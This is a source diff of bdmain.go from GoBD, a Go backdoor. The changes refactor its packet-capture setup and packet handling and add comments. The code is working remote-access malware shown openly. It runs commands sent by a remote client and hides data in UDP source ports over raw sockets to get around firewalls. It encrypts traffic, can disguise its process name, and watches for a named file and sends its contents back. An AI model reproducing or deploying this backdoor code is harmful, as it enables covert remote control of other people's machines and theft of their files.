@@ -1,29 +1,23 @@
 package main
 /* bdmain.go
-PROGRAM: GoBD
-AUTHOR: Ramzi Chennafi
-DATE: October 18 2015
-FUNCTIONS:
- main()
- SetProcessName(string) error
- intiateClient(ip string, port, lport int)
- grabOutput(serverConn *net.UDPConn) 
- intiateServer(iface string, port, lport int)
- handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int)
- executeServerCommand(data, ip string, port int)
- executeCommand(cmd, ip string, port int)
- sendEncryptedData(port int, data, ip string)
- checkError(err error) 
- GetLocalIP() string
+   PROGRAM: GoBD
+   AUTHOR: Ramzi Chennafi
+   DATE: October 18 2015
+   FUNCTIONS:
+       main()
+       beginListen(ip string, port, lport uint16)
+       monitorFile(ip, filename string, port uint16)
+       executeServerCommand(data, ip string, port uint16)
+       executeCommand(cmd, ip string, port uint16)
+   ABOUT:
+       bdmain.go is the central code body for the GoBD program. Contained within are all methods related to starting and stopping 
+   the server and client. The communications are done using UDP and covert data hiding within the source port of the UDP packets.
+   All transfers are done using raw sockets and as such, bypass system firewall rules. Furthermore, all data is encrypted with AES-256
+   prior to being covertly sent.
 
-ABOUT:
-  bdmain.go is the central code body for the GoBD program. Contained within are all methods related to starting and stopping 
- the server and client. The communications are done using UDP  including packet sniffing to create backdoor communications. 
- All messages are encrypted using AES-256 and client to sever connections require authentication using the control code.
-
-USAGE:
- Type GoBD --help. While authenticated type ?help for more info on client options. Requires a backdoor to connect to. These
- two programs can be used across any operating system, commands will be executed the same.
+   USAGE:
+       Type GoBD --help. While authenticated type ?help for more info on client options. Requires a backdoor to connect to. These
+   two programs can be used across any operating system, commands will be executed the same.
 */
 import(
 	"os"
@@ -41,28 +35,30 @@ import(
 	"github.com/google/gopacket"
 	"net"
 )
-
-const passwd = "D"; //The authentication code
-const MAX_PORT uint16 = 65535
-const CLIENT = 1
-const SERVER = 0
-const SND_CMPLETE uint16 = 3414
-const FSND_CMPLETE uint16 = 3415
-const FTRANSFER  = 1
-const CMD = 0
-const helpStr = "Client Usage Help\n" +"=================================\n" +
+const (
+	FPORT = 1
+	passwd = "D"; //The authentication code
+	MAX_PORT uint16 = 65535
+        CLIENT = 1
+        SERVER = 0
+        SND_CMPLETE uint16 = 3414
+	FSND_CMPLETE uint16 = 3415
+	FTRANSFER  = 1
+	CMD = 0
+	HELPSTR= "Client Usage Help\n" +"=================================\n" +
 "EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
 "Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"
-
-var authenticatedAddr string //Currently authenticated address
-var handle *pcap.Handle
-var fhandle *pcap.Handle
-var err error
-var localip net.IP
-var localmac net.HardwareAddr
-var destmac net.HardwareAddr
-var pType int
-var i int
+)
+var (
+	authenticatedAddr string //Currently authenticated address
+        handle *pcap.Handle
+	fhandle *pcap.Handle
+	err error
+	localip net.IP
+	localmac net.HardwareAddr
+	destmac net.HardwareAddr
+	pType int
+)
 /* 
     FUNCTION: func main()
     RETURNS: Nothing
@@ -71,8 +67,6 @@ var i int
     The main loop of program execution. Allows for retreiving of flags and intiation of client / server.
 */
 func main(){
-
-	//SetProcessName("dnsp")
 
 	//flags
 	modePtr      := flag.String("mode", "client", "The mode of the application, may either be" +
@@ -115,20 +109,7 @@ func main(){
 	}
 
 	intiateTools()
-	
-	handle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
-	checkError(err)
-	defer handle.Close()
-
-	err = handle.SetBPFFilter("udp")
-	checkError(err)
-
-	fhandle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
-	checkError(err)
-	defer fhandle.Close()
-
-	err = fhandle.SetBPFFilter("udp")
-	checkError(err)
+        intiateHandles(*interfacePtr)	
 
 	switch *modePtr {
 	case "client":
@@ -142,6 +123,44 @@ func main(){
 		beginListen(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
 	}
 }
+/* 
+    FUNCTION: intiateHandles(iface string)
+    RETURNS: Nothing
+    ARGUMENTS: 
+                string iface - the interface to monitor
+
+    ABOUT:
+    Intiates all packet capture handles for the client. One for the main system and one for the file thread.
+*/
+func intiateHandles(iface string) {
+
+	handle, err = pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
+	checkError(err)
+	defer handle.Close()
+
+	err = handle.SetBPFFilter("udp")
+	checkError(err)
+
+	fhandle, err = pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
+	checkError(err)
+	defer fhandle.Close()
+
+	err = fhandle.SetBPFFilter("udp")
+	checkError(err)
+
+}
+/* 
+    FUNCTION: beginListen(ip string, port, lport uint16)
+    RETURNS: Nothing
+    ARGUMENTS: 
+                string ip : the ip address of the server
+                uint16 port : port to send data to
+                uint16 lport : port to listen for data on
+
+    ABOUT:
+    Intiates the listen loop of the program for both the client and server. 
+    Will perform differently based on the user specified mode.
+*/
 func beginListen(ip string, port, lport uint16) {
 
 	var ipLayer layers.IPv4
@@ -171,28 +190,39 @@ func beginListen(ip string, port, lport uint16) {
 		incomingIP := ipLayer.SrcIP.String()
 		
 		if pType == CLIENT {
-			if incomingIP  == ip && uint16(udpLayer.DstPort) == lport {
-				err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
-				checkError(err)
-			} else if incomingIP == ip && uint16(udpLayer.DstPort) == SND_CMPLETE {
-				data := decrypt_data(buffer.Bytes())
-				fmt.Print(string(data))
-				buffer.Reset()
+			if incomingIP == ip {
+				switch uint16(udpLayer.DstPort){
+
+				case lport:
+					err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
+					checkError(err)
+					break;
+
+				case SND_CMPLETE:
+					data := decrypt_data(buffer.Bytes())
+					fmt.Print(string(data))
+					buffer.Reset()
+				}
 			}
 		} else {
-			if incomingIP == authenticatedAddr && uint16(udpLayer.DstPort) == lport {
-				err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
-				checkError(err)
-			} else if incomingIP == authenticatedAddr && uint16(udpLayer.DstPort) == SND_CMPLETE {
-				strData := string(decrypt_data(buffer.Bytes()))
-				if strings.HasPrefix(strData, "[EXEC]") {
-					executeCommand(strData, incomingIP, port);
+			if incomingIP == authenticatedAddr {
+				switch uint16(udpLayer.DstPort) {
+
+				case lport:
+					err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
+					checkError(err)
+					break
+
+				case SND_CMPLETE:
+					strData := string(decrypt_data(buffer.Bytes()))
+					if strings.HasPrefix(strData, "[EXEC]") {
+						executeCommand(strData, incomingIP, port);
+					}
+					if strings.HasPrefix(strData, "[BD]") {
+						executeServerCommand(strData, incomingIP, port);
+					}
+					buffer.Reset()
 				}
-				if strings.HasPrefix(strData, "[BD]") {
-					executeServerCommand(strData, incomingIP, port);
-				}
-				buffer.Reset()
-				
 			} else if uint16(udpLayer.DstPort) == lport {
 				
 				data := decrypt_data(udpLayer.Payload)
@@ -207,16 +237,17 @@ func beginListen(ip string, port, lport uint16) {
 	}
 }
 /* 
-    FUNCTION: func  executeServerCommand(data, ip string, port int) 
+    FUNCTION: executeServerCommand(data, ip string, port uint16) 
     RETURNS: Nothing
     ARGUMENTS: 
                 string ip : the ip address of the server
-                int port : port to send data to
+                uint16 port : port to send data to
                 string data : command to execute
 
     ABOUT:
     Executes incoming client commands on the GoBD program itself. Current commands include:
-              setprocess [name] - sets the process name of the gobd program
+              setprocess [name]  - sets the process name of the gobd program
+              monitor [filename] - monitors for the specified filename, sends when found
               exit - exits the gobd program cleanly
 */
 func executeServerCommand(data, ip string, port uint16) {
@@ -229,6 +260,7 @@ func executeServerCommand(data, ip string, port uint16) {
 	var out string;
 	
 	switch args[0] {
+
 	case "setprocess" :
 		err := SetProcessName(args[1]);
 		if err != nil {
@@ -240,8 +272,8 @@ func executeServerCommand(data, ip string, port uint16) {
 		break;
 		
 	case "monitor":
-		sendEncryptedData(port, "Monitoring for requested file\n", ip, CMD);
-		go monitorFile(ip, args[1], port + 1);
+		sendEncryptedData(port, "Monitoring file " + args[1] + "...\n", ip, CMD);
+		go monitorFile(ip, args[1], port);
 		break;
 
 	case "exit" :
@@ -257,7 +289,18 @@ func executeServerCommand(data, ip string, port uint16) {
 
 	sendEncryptedData(port, out, ip, CMD);	
 }
+/* 
+    FUNCTION: monitorFile(ip, filename string, port uint16)
+    RETURNS: Nothing
+    ARGUMENTS: 
+                string ip       - the ip address of the server
+                string filename - the filename to monitor for
+                uint16 port     - the port to send data on, adds the FPORT value to this 
 
+    ABOUT:
+    Monitors for the filename specified. Once the file is found, the data is sent to the specified ip
+    and port (port + FPORT). Exits thread once transfer is finished.
+*/
 func monitorFile(ip, filename string, port uint16){
 
 	for {
@@ -267,22 +310,23 @@ func monitorFile(ip, filename string, port uint16){
 
 			file, err := ioutil.ReadFile(filename)
 			checkError(err)
-			
-			sendEncryptedData(port, string(file), ip, FTRANSFER)
+
+			sendEncryptedData(port + FPORT, string(file), ip, FTRANSFER)
 			return
 		}
 	}
 }
 /* 
-    FUNCTION: func  executeCommand(cmd, ip string, port int) 
+    FUNCTION: executeCommand(cmd, ip string, port uint16) 
     RETURNS: Nothing
     ARGUMENTS: 
                 string ip : the ip address of the server
-                int port : port to send data to
+                uint16 port : port to send data to
                 string cmd : command to execute
 
     ABOUT:
-    Executes incoming client commands on the host machine.
+    Executes incoming client commands on the host machine. Trims and excess
+    nulls and spaces off each argument.
 */
 func executeCommand(cmd, ip string, port uint16){
 	
